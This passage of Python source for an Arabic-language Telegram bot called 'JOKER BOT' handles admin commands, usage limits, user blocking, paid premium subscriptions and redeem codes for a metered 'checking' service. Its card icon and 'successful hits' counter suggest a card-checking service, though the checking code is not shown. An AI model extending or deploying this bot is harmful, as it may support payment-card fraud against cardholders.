        await event.reply(premium_emoji("❌ عدد غير صالح."), parse_mode='html')
        return
    users = load_users()
    target_id_str = str(target_id)
    if target_id_str not in users:
        users[target_id_str] = {}
    users[target_id_str]['check_limit'] = new_limit
    users[target_id_str]['premium'] = True
    save_users(users)
    await event.reply(premium_emoji(f"✅ <b>تم تعديل الحد الأقصى للمستخدم {target_id}</b>\n\nالحد الجديد: {new_limit} عملية فحص"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/users'))
async def list_users_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>هذا الأمر للأدمن فقط.</b>"), parse_mode='html')
        return
    users = get_all_users()
    if not users:
        await event.reply(premium_emoji("📋 لا يوجد مستخدمين."), parse_mode='html')
        return
    text = "<b>📋 قائمة المستخدمين:</b>\n\n"
    for uid, data in users.items():
        username = data.get('username', 'Unknown')
        premium = "👑" if is_admin(int(uid)) else ("⭐" if data.get('premium', False) else "🆓")
        blocked = "🚫" if data.get('blocked', False) else "✅"
        total = data.get('total_checks', 0)
        text += f"`{uid}` | {username} | {premium} | {blocked} | {total} فحص\n"
        if len(text) > 3500:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"users_{timestamp}.txt"
            async with aiofiles.open(filename, 'w') as f:
                await f.write(text)
            await event.reply(file=filename)
            try:
                os.remove(filename)
            except:
                pass
            text = ""
    if text:
        await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/user'))
async def user_info_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>هذا الأمر للأدمن فقط.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ الاستخدام: <code>/user معرف_المستخدم</code>"), parse_mode='html')
        return
    target_id = args[1]
    users = load_users()
    user_data = users.get(target_id, {})
    if not user_data:
        await event.reply(premium_emoji(f"❌ المستخدم {target_id} غير موجود."), parse_mode='html')
        return
    is_target_admin = is_admin(int(target_id))
    text = f"""<b>👤 بيانات المستخدم {target_id}</b>

├ 📝 اليوزر: @{user_data.get('username', 'Unknown')}
├ ⭐ الحالة: {'👑 أدمن' if is_target_admin else '✅ مميز' if user_data.get('premium', False) else '❌ تجريبي'}
├ 🚫 الحظر: {'محظور' if user_data.get('blocked', False) else 'غير محظور'}
├ 📈 إجمالي الفحوصات: {user_data.get('total_checks', 0)}
├ 💥 النتائج الناجحة: {user_data.get('successful_checks', 0)}
├ 💳 الحد الأقصى: {user_data.get('check_limit', 0) if not is_target_admin else 'غير محدود'}
├ 💰 العمليات المتبقية: {max(0, user_data.get('check_limit', 0) - user_data.get('total_checks', 0)) if not is_target_admin else '♾️'}
└ 📅 تاريخ التسجيل: {user_data.get('registered_at', 'Unknown')[:10]}"""
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/stats'))
async def bot_stats_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>هذا الأمر للأدمن فقط.</b>"), parse_mode='html')
        return
    users = get_all_users()
    total_users = len(users)
    premium_users = len([u for u in users.values() if u.get('premium', False)])
    admin_count = len(ADMIN_IDS)
    blocked_users = len([u for u in users.values() if u.get('blocked', False)])
    total_checks = sum(u.get('total_checks', 0) for u in users.values())
    total_codes = len(load_codes())
    text = f"""<b>📊 إحصائيات البوت</b>

├ 👥 إجمالي المستخدمين: {total_users}
├ 👑 الأدمن: {admin_count}
├ ⭐ المستخدمين المميزين: {premium_users}
├ 🚫 المستخدمين المحظورين: {blocked_users}
├ 📈 إجمالي الفحوصات: {total_checks}
├ 🎫 إجمالي الأكواد: {total_codes}
└ ⏱️ آخر تحديث: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/subscribe'))
async def subscribe_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    await event.reply(premium_emoji(f"⭐ <b>الاشتراك المميز</b>\n\nسعر الاشتراك: {PREMIUM_PRICE_STARS} نجمة\nعدد الفحوصات: {DEFAULT_CHECK_LIMIT} عملية فحص\n\nللاشتراك، قم بإرسال {PREMIUM_PRICE_STARS} نجمة إلى البوت.\n\nبعد الدفع، سيتم تفعيل اشتراكك تلقائياً.\n\nللتواصل مع الأدمن: @Joker"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
async def redeem_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    if is_admin(user_id):
        await event.reply(premium_emoji("👑 <b>أنت أدمن، لا تحتاج تفعيل!</b>"), parse_mode='html')
        return
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ الاستخدام: <code>/redeem الكود</code>"), parse_mode='html')
        return
    code = args[1].strip().upper()
    success, message = activate_code(user_id, code)
    if success:
        await event.reply(premium_emoji(f"✅ <b>تم التفعيل بنجاح!</b>\n\n{message}"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"❌ <b>فشل التفعيل!</b>\n\n{message}"), parse_mode='html')

# ==================== أحداث الأزرار ====================

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ تم الإيقاف")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ تم الاستمرار")

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 تم الإلغاء")
        await event.edit(premium_emoji("🛑 <b>تم إلغاء الفحص بواسطة المستخدم.</b>"), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"admin_stats"))
async def admin_stats_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ هذا الأمر للأدمن فقط", alert=True)
        return
    users = get_all_users()
    total_users = len(users)
    premium_users = len([u for u in users.values() if u.get('premium', False)])
    blocked_users = len([u for u in users.values() if u.get('blocked', False)])
    total_checks = sum(u.get('total_checks', 0) for u in users.values())
    stats_text = f"""<b>📊 إحصائيات البوت</b>

├ 👥 إجمالي المستخدمين: {total_users}
├ ⭐ المستخدمين المميزين: {premium_users}
├ 🚫 المستخدمين المحظورين: {blocked_users}
├ 📈 إجمالي الفحوصات: {total_checks}
└ ⏱️ آخر تحديث: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
    await event.edit(premium_emoji(stats_text), buttons=get_admin_menu_keyboard(), parse_mode='html')
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"admin_broadcast"))
async def admin_broadcast_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ هذا الأمر للأدمن فقط", alert=True)
        return
    await event.edit(premium_emoji("📢 <b>أرسل الرسالة التي تريد إذاعتها للمستخدمين</b>\n\nلإلغاء الأمر أرسل /cancel"), parse_mode='html')
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"admin_block"))
async def admin_block_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ هذا الأمر للأدمن فقط", alert=True)
        return
    await event.edit(premium_emoji("🔨 <b>أرسل معرف المستخدم الذي تريد حظره</b>\n\nمثال: <code>123456789</code>\n\nلإلغاء الأمر أرسل /cancel"), parse_mode='html')
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"admin_unblock"))
async def admin_unblock_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ هذا الأمر للأدمن فقط", alert=True)
        return
    await event.edit(premium_emoji("🔓 <b>أرسل معرف المستخدم الذي تريد إلغاء حظره</b>\n\nمثال: <code>123456789</code>\n\nلإلغاء الأمر أرسل /cancel"), parse_mode='html')
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"admin_set_limit"))
async def admin_set_limit_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ هذا الأمر للأدمن فقط", alert=True)
        return
    await event.edit(premium_emoji("📈 <b>أرسل معرف المستخدم والعدد الجديد</b>\n\nمثال: <code>123456789 5000</code>\n\nلإلغاء الأمر أرسل /cancel"), parse_mode='html')
    await event.answer()

# ==================== التشغيل ====================

async def auto_add_admins():
    for admin_id in ADMIN_IDS:
        admin_id_str = str(admin_id)
        users = load_users()
        if admin_id_str not in users:
            users[admin_id_str] = {
                'user_id': admin_id,
                'username': 'admin',
                'registered_at': datetime.now().isoformat(),
                'total_checks': 0,
                'successful_checks': 0,
                'premium': True,
                'check_limit': ADMIN_MAX_CHECKS,
                'blocked': False,
                'is_admin': True
            }
            save_users(users)
            print(f"✅ تمت إضافة الأدمن {admin_id} تلقائياً!")

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    await auto_add_admins()
    print("=" * 50)
    print("✅ تم تشغيل البوت بنجاح!")
    print("⚡ JOKER BOT")
    print(f"📡 رابط API: {CHECKER_API_URL}")
    print("=" * 50)
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
